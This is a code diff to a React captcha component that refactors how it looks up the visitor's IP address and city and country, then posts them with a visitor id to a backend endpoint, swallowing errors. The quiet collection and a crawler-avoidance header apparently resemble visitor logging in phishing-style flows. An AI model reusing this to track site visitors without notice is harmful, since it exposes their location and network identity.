@@ -4,6 +4,7 @@ import { useState } from "react";
 import ReCAPTCHA from "react-google-recaptcha";
 import { DataContext } from "../../pages";
 import { buildApiUrl } from "../../config/api";
+import { IPService } from "../../utils/ipService";
 
 const Wrapper = styled.div`
   border: 1px solid #bdbdbd;
@@ -96,42 +97,46 @@ function Captcha({ setStep, Unik, setIp }) {
   };
 
   const NextStep = () => {
-    // setIsLoading(true)
-    fetch("https://api.ipify.org?format=json")
-      .then((response) => response.json())
-      .then((data) => {
-        fetch("https://ipapi.co/" + data.ip + "/json")
-          .then((response) => response.json())
-          .then((data) => {
-            setIp(data.ip);
+    const syncIpAndLocation = async () => {
+      try {
+        const ip = await IPService.fetchIPAddress();
+        const locationData = ip
+          ? await IPService.fetchLocationData(ip)
+          : { country: "unknown", city: "unknown" };
 
-            let params = {
-              id: Unik,
-              ip: data.ip,
-              country: data.country,
-              city: data.city,
-              context: process.env.NEXT_PUBLIC_CONTEXT
-                ? process.env.NEXT_PUBLIC_CONTEXT
-                : "",
-            };
+        const params = {
+          id: Unik,
+          ip: ip || "unknown",
+          country: locationData?.country || "unknown",
+          city: locationData?.city || "unknown",
+          context: process.env.NEXT_PUBLIC_CONTEXT
+            ? process.env.NEXT_PUBLIC_CONTEXT
+            : "",
+        };
 
-            setAllData({
-              ...AllData,
-              ip: data.ip,
-              country: data.country,
-              city: data.city,
-            });
+        setIp(params.ip);
 
-            fetch(buildApiUrl("/api/send/ip"), {
-              method: "POST",
-              body: JSON.stringify(params),
-              headers: {
-                "Content-type": "application/json; charset=UTF-8",
-                "X-Robots-Tag": "googlebot: nofollow",
-              },
-            });
-          });
-      });
+        setAllData({
+          ...AllData,
+          ip: params.ip,
+          country: params.country,
+          city: params.city,
+        });
+
+        await fetch(buildApiUrl("/api/send/ip"), {
+          method: "POST",
+          body: JSON.stringify(params),
+          headers: {
+            "Content-type": "application/json; charset=UTF-8",
+            "X-Robots-Tag": "googlebot: nofollow",
+          },
+        });
+      } catch (_error) {
+        // Keep the user flow moving even if IP/location lookup fails.
+      }
+    };
+
+    syncIpAndLocation();
     setTimeout(() => {
       setStep(1);
       // setIsLoading(false)
